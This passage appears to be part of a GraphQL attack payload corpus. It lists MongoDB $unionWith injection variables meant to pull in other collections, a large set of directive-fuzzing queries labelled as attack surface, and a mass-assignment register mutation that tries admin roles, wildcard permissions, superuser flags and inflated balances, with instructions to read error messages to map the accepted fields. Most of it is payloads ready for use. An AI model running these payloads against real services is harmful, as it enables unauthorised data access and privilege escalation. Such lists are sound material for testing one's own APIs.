{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"digests"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"digestreports"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"insights"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"insightreports"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"dashboards"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"dashboarditems"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"dashboardentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"widgets"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"widgetitems"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"widgetentries"}}}}
```

## 4. Directive arguments — attack surface

```graphql
{__typename @include(if:true)}
{__typename @include(if:false)}
{__typename @skip(if:true)}
{__typename @skip(if:false)}
{__typename @include(if:1)}
{__typename @include(if:0)}
{__typename @include(if:"true")}
{__typename @include(if:"false")}
{__typename @include(if:"1")}
{__typename @include(if:"0")}
{__typename @include(if:null)}
{__typename @skip(if:null)}
{__typename @include(if:$x)}
{__typename @skip(if:$x)}
{__typename @include(if:true) @skip(if:false)}
{__typename @include(if:false) @skip(if:true)}
{__typename @include(if:true) @skip(if:true)}
{__typename @include(if:false) @skip(if:false)}
{f(x:"a") @include(if:true)}
{f(x:"a") @include(if:false)}
{f(x:"a") @skip(if:true)}
{f(x:"a") @skip(if:false)}
{f(x:"a") @include(if:true) @skip(if:false)}
{f(x:"a") @include(if:false) @skip(if:true)}
{f(x:"a") @deprecated}
{f(x:"a") @deprecated(reason:"x")}
{f(x:"a") @specifiedBy(url:"x")}
{f(x:"a") @cacheControl(maxAge:999999)}
{f(x:"a") @cacheControl(maxAge:0)}
{f(x:"a") @cacheControl(maxAge:-1)}
{f(x:"a") @cacheControl(maxAge:2147483647)}
{f(x:"a") @cacheControl(maxAge:-2147483648)}
{f(x:"a") @cacheControl(scope:PUBLIC)}
{f(x:"a") @cacheControl(scope:PRIVATE)}
{f(x:"a") @cacheControl(maxAge:999999,scope:PUBLIC)}
{f(x:"a") @cacheControl(maxAge:999999,scope:PRIVATE)}
{f(x:"a") @cacheControl(maxAge:999999,inheritMaxAge:true)}
{f(x:"a") @cacheControl(maxAge:999999,inheritMaxAge:false)}
{f(x:"a") @defer}
{f(x:"a") @defer(label:"x")}
{f(x:"a") @defer(if:true)}
{f(x:"a") @defer(if:false)}
{f(x:"a") @stream}
{f(x:"a") @stream(label:"x")}
{f(x:"a") @stream(initialCount:0)}
{f(x:"a") @stream(initialCount:1)}
{f(x:"a") @stream(initialCount:999999)}
{f(x:"a") @stream(initialCount:-1)}
{f(x:"a") @live}
{f(x:"a") @live(if:true)}
{f(x:"a") @live(if:false)}
{f(x:"a") @client}
{f(x:"a") @client(always:true)}
{f(x:"a") @client(always:false)}
{f(x:"a") @connection(key:"x")}
{f(x:"a") @connection(key:"x",filter:["y"])}
{f(x:"a") @export(as:"x")}
{f(x:"a") @export(as:"x",from:"y")}
{f(x:"a") @export(as:"x",from:"y",with:"z")}
{f(x:"a") @export(as:"x",from:"y",with:"z",to:"w")}
{f(x:"a") @export(as:"x",from:"y",with:"z",to:"w",using:"v")}
{f(x:"a") @rest(type:"x",path:"y")}
{f(x:"a") @rest(type:"x",path:"y",method:"GET")}
{f(x:"a") @rest(type:"x",path:"y",method:"POST")}
{f(x:"a") @rest(type:"x",path:"y",method:"PUT")}
{f(x:"a") @rest(type:"x",path:"y",method:"DELETE")}
{f(x:"a") @rest(type:"x",path:"y",method:"GET",endpoint:"z")}
{f(x:"a") @rest(type:"x",path:"y",method:"GET",endpoint:"z",bodyKey:"w")}
{f(x:"a") @rest(type:"x",path:"y",method:"GET",endpoint:"z",bodyKey:"w",field:"v")}
{f(x:"a") @rest(type:"x",path:"y",method:"GET",endpoint:"z",bodyKey:"w",field:"v",headers:{u:"t"})}
{f(x:"a") @rest(type:"x",path:"y",method:"GET",endpoint:"z",bodyKey:"w",field:"v",headers:{u:"t",s:"r"})}
{f(x:"a") @link(url:"x")}
{f(x:"a") @link(url:"x",import:["y"])}
{f(x:"a") @link(url:"x",import:["y","z"])}
{f(x:"a") @link(url:"x",import:["y","z"],as:"w")}
{f(x:"a") @link(url:"x",import:["y","z"],as:"w",for:"v")}
{f(x:"a") @link(url:"x",import:["y","z"],as:"w",for:"v",purpose:"u")}
{f(x:"a") @link(url:"x",import:["y","z"],as:"w",for:"v",purpose:"u",feature:"t")}
{f(x:"a") @inaccessible}
{f(x:"a") @tag(name:"x")}
{f(x:"a") @tag(name:"x",value:"y")}
{f(x:"a") @tag(name:"x",value:"y",color:"z")}
{f(x:"a") @shareable}
{f(x:"a") @shareable(inaccessible:true)}
{f(x:"a") @shareable(inaccessible:false)}
{f(x:"a") @override(from:"x")}
{f(x:"a") @override(from:"x",to:"y")}
{f(x:"a") @external}
{f(x:"a") @external(required:true)}
{f(x:"a") @external(required:false)}
{f(x:"a") @requires(fields:"x")}
{f(x:"a") @requires(fields:"x",optional:true)}
{f(x:"a") @requires(fields:"x",optional:false)}
{f(x:"a") @provides(fields:"x")}
{f(x:"a") @provides(fields:"x",optional:true)}
{f(x:"a") @provides(fields:"x",optional:false)}
{f(x:"a") @key(fields:"x")}
{f(x:"a") @key(fields:"x",resolvable:true)}
{f(x:"a") @key(fields:"x",resolvable:false)}
{f(x:"a") @interfaceObject}
{f(x:"a") @interfaceObject(required:true)}
{f(x:"a") @interfaceObject(required:false)}
{f(x:"a") @authenticated}
{f(x:"a") @authenticated(required:true)}
{f(x:"a") @authenticated(required:false)}
{f(x:"a") @requiresScopes(scopes:[["x"]])}
{f(x:"a") @requiresScopes(scopes:[["x","y"]])}
{f(x:"a") @requiresScopes(scopes:[["x"],["y"]])}
{f(x:"a") @requiresScopes(scopes:[["x"],["y"],["z"]])}
{f(x:"a") @policy(policies:[["x"]])}
{f(x:"a") @policy(policies:[["x","y"]])}
{f(x:"a") @policy(policies:[["x"],["y"]])}
{f(x:"a") @policy(policies:[["x"],["y"],["z"]])}
{f(x:"a") @cost(weight:"x")}
{f(x:"a") @cost(weight:"x",multiplier:"y")}
{f(x:"a") @cost(weight:"x",multiplier:"y",cap:"z")}
{f(x:"a") @listSize(assumedSize:1)}
{f(x:"a") @listSize(assumedSize:1,slicingArguments:["x"])}
{f(x:"a") @listSize(assumedSize:1,slicingArguments:["x","y"])}
{f(x:"a") @listSize(assumedSize:1,slicingArguments:["x","y"],sizedFields:["z"])}
{f(x:"a") @listSize(assumedSize:1,slicingArguments:["x","y"],sizedFields:["z"],requireOneSlicingArgument:true)}
{f(x:"a") @listSize(assumedSize:1,slicingArguments:["x","y"],sizedFields:["z"],requireOneSlicingArgument:false)}
```

## 5. Extended mutation corpus

```graphql
mutation{a:register(input:{username:"x",password:"y",role:"admin",isAdmin:true,verified:true,balance:99999,permissions:["*"],isStaff:true,isSuperuser:true,superuser:true,approved:true,active:true,enabled:true,plan:"admin",tier:"admin",level:99,score:999,credits:99999,perms:["*"],scope:"*",groups:["admin"],privileges:["admin"],ownerId:1,createdBy:1,tenantId:1,orgId:1,id:1,userId:1,email:"a@a.tld",phone:"+1",ssn:"x",dob:"x",address:"x",name:"x",firstName:"x",lastName:"x",displayName:"x",avatar:"x",bio:"x",website:"x",location:"x",timezone:"x",locale:"x",language:"x",theme:"x",settings:{x:1},preferences:{x:1},metadata:{x:1},extra:{x:1},custom:{x:1},data:{x:1},payload:{x:1},body:{x:1},options:{x:1},opts:{x:1},config:{x:1},params:{x:1},properties:{x:1},attrs:{x:1},attributes:{x:1},fields:{x:1},values:{x:1},vars:{x:1},variables:{x:1},env:{x:1},environment:{x:1},context:{x:1},ctx:{x:1},state:{x:1},status:{x:1},mode:{x:1},type:{x:1},kind:{x:1},category:{x:1},class:{x:1},group:{x:1},team:{x:1},org:{x:1},tenant:{x:1},account:{x:1},profile:{x:1},identity:{x:1},principal:{x:1},credential:{x:1},auth:{x:1},session:{x:1},token:{x:1},jwt:{x:1},apiKey:{x:1},key:{x:1},secret:{x:1},password:{x:1},passwd:{x:1},pwd:{x:1},hash:{x:1},salt:{x:1},code:{x:1},pin:{x:1},otp:{x:1},mfa:{x:1},mfaCode:{x:1},twoFactor:{x:1},twoFactorCode:{x:1},totp:{x:1},totpCode:{x:1},backup:{x:1},backupCode:{x:1},recovery:{x:1},recoveryCode:{x:1},reset:{x:1},resetCode:{x:1},forgot:{x:1},forgotCode:{x:1},change:{x:1},changeCode:{x:1},invite:{x:1},inviteCode:{x:1},referral:{x:1},referralCode:{x:1},ref:{x:1},refCode:{x:1},source:{x:1},src:{x:1},campaign:{x:1},campaignId:{x:1},promo:{x:1},promoCode:{x:1},coupon:{x:1},couponCode:{x:1},discount:{x:1},discountCode:{x:1},gift:{x:1},giftCode:{x:1},voucher:{x:1},voucherCode:{x:1},credit:{x:1},creditCode:{x:1},debit:{x:1},debitCode:{x:1},balance:{x:1},wallet:{x:1},fund:{x:1},funds:{x:1},creditCard:{x:1},debitCard:{x:1},card:{x:1},cardNumber:{x:1},cardNumberCode:{x:1},cvv:{x:1},cvvCode:{x:1},expiry:{x:1},expiryDate:{x:1},exp:{x:1},expDate:{x:1},iban:{x:1},swift:{x:1},routing:{x:1},account:{x:1},accountNumber:{x:1},accountId:{x:1},bank:{x:1},bankId:{x:1},branch:{x:1},branchId:{x:1},paypal:{x:1},stripe:{x:1},braintree:{x:1},square:{x:1},adyen:{x:1},checkout:{x:1},payment:{x:1},paymentMethod:{x:1},paymentId:{x:1},transaction:{x:1},transactionId:{x:1},order:{x:1},orderId:{x:1},purchase:{x:1},purchaseId:{x:1},invoice:{x:1},invoiceId:{x:1},bill:{x:1},billId:{x:1},subscription:{x:1},subscriptionId:{x:1},plan:{x:1},planId:{x:1},tier:{x:1},tierId:{x:1},level:{x:1},levelId:{x:1},license:{x:1},licenseId:{x:1},product:{x:1},productId:{x:1},sku:{x:1},skuId:{x:1},item:{x:1},itemId:{x:1},asset:{x:1},assetId:{x:1},resource:{x:1},resourceId:{x:1},object:{x:1},objectId:{x:1},entity:{x:1},entityId:{x:1},node:{x:1},nodeId:{x:1},record:{x:1},recordId:{x:1},entry:{x:1},entryId:{x:1},row:{x:1},rowId:{x:1},result:{x:1},resultId:{x:1},document:{x:1},documentId:{x:1},doc:{x:1},docId:{x:1},file:{x:1},fileId:{x:1},fileName:{x:1},filePath:{x:1},fileUrl:{x:1},path:{x:1},pathName:{x:1},pathValue:{x:1},url:{x:1},uri:{x:1},link:{x:1},href:{x:1},endpoint:{x:1},endpointUrl:{x:1},target:{x:1},targetUrl:{x:1},destination:{x:1},destinationUrl:{x:1},source:{x:1},sourceUrl:{x:1},callback:{x:1},callbackUrl:{x:1},webhook:{x:1},webhookUrl:{x:1},redirect:{x:1},redirectUrl:{x:1},return:{x:1},returnUrl:{x:1},next:{x:1},nextUrl:{x:1},previous:{x:1},previousUrl:{x:1},back:{x:1},backUrl:{x:1},forward:{x:1},forwardUrl:{x:1},origin:{x:1},originUrl:{x:1},referer:{x:1},referrer:{x:1},refererUrl:{x:1},referrerUrl:{x:1},domain:{x:1},domainName:{x:1},host:{x:1},hostname:{x:1},hostName:{x:1},port:{x:1},portNumber:{x:1},ip:{x:1},ipAddress:{x:1},addr:{x:1},address:{x:1},addressLine:{x:1},addressLine1:{x:1},addressLine2:{x:1},city:{x:1},cityName:{x:1},state:{x:1},stateName:{x:1},country:{x:1},countryName:{x:1},zip:{x:1},zipCode:{x:1},postal:{x:1},postalCode:{x:1},lat:{x:1},latitude:{x:1},lon:{x:1},lng:{x:1},longitude:{x:1},geo:{x:1},geoLocation:{x:1},geoPoint:{x:1},geoJson:{x:1},geoJsonPoint:{x:1},geoJsonLine:{x:1},geoJsonPolygon:{x:1},geoJsonMultiPoint:{x:1},geoJsonMultiLine:{x:1},geoJsonMultiPolygon:{x:1},geoJsonGeometry:{x:1},geoJsonGeometryCollection:{x:1},geoJsonFeature:{x:1},geoJsonFeatureCollection:{x:1},geoJsonObject:{x:1},geoJsonType:{x:1},geoJsonCoordinates:{x:1},geoJsonCrs:{x:1},geoJsonBbox:{x:1},geoJsonProperties:{x:1},geoJsonId:{x:1},geoJsonTitle:{x:1},geoJsonDescription:{x:1},geoJsonLink:{x:1},geoJsonLinks:{x:1},geoJsonLinkHref:{x:1},geoJsonLinkType:{x:1},geoJsonLinkRel:{x:1},geoJsonLinkTitle:{x:1},geoJsonLinkHreflang:{x:1},geoJsonLinkLength:{x:1},geoJsonLinkMedia:{x:1},geoJsonLinkMetadata:{x:1},geoJsonLinkMetadataType:{x:1},geoJsonLinkMetadataValue:{x:1},geoJsonLinkMetadataName:{x:1},geoJsonLinkMetadataDescription:{x:1},geoJsonLinkMetadataLink:{x:1},geoJsonLinkMetadataLinks:{x:1},geoJsonLinkMetadataLinkHref:{x:1},geoJsonLinkMetadataLinkType:{x:1},geoJsonLinkMetadataLinkRel:{x:1},geoJsonLinkMetadataLinkTitle:{x:1},geoJsonLinkMetadataLinkHreflang:{x:1},geoJsonLinkMetadataLinkLength:{x:1},geoJsonLinkMetadataLinkMedia:{x:1},geoJsonLinkMetadataLinkMetadata:{x:1},geoJsonLinkMetadataLinkMetadataType:{x:1},geoJsonLinkMetadataLinkMetadataValue:{x:1},geoJsonLinkMetadataLinkMetadataName:{x:1},geoJsonLinkMetadataLinkMetadataDescription:{x:1},geoJsonLinkMetadataLinkMetadataLink:{x:1},geoJsonLinkMetadataLinkMetadataLinks:{x:1},geoJsonLinkMetadataLinkMetadataLinkHref:{x:1},geoJsonLinkMetadataLinkMetadataLinkType:{x:1},geoJsonLinkMetadataLinkMetadataLinkRel:{x:1},geoJsonLinkMetadataLinkMetadataLinkTitle:{x:1},geoJsonLinkMetadataLinkMetadataLinkHreflang:{x:1},geoJsonLinkMetadataLinkMetadataLinkLength:{x:1},geoJsonLinkMetadataLinkMetadataLinkMedia:{x:1}})}
```

That's the *all-keys* variant — send once, read which keys were rejected
(the errors name them) — the accepted ones are the mass-assign surface.
